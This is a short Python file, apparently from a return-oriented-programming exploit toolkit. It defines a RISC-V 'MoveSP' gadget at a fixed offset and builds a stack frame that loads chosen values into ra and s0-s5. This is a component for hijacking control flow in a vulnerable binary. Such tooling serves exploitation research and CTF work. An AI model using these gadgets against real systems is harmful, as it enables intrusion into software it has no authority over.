from bf_parser.rop_gadgets_base_class import ROP_Gadget

class MoveSP(ROP_Gadget):
    '''
    addi sp, s0, -0x50
    ld ra, 0x48(sp)
    ld s0, 0x40(sp)
    ld s1, 0x38(sp)
    ld s2, 0x30(sp)
    ld s3, 0x28(sp)
    ld s4, 0x20(sp)
    ld s5, 0x18(sp)
    addi sp, sp, 0x50
    jr ra
    '''
    def __init__(self):
        super().__init__(0x21552, 0x50)

    def construct_frame(self, ra=0, s0=0, s1=0, s2=0, s3=0, s4=0, s5=0):
        data = [0, 0, 0, s5, s4, s3, s2, s1, s0, ra]
        self.set_stack_frame(data)
        return self.print_gadget()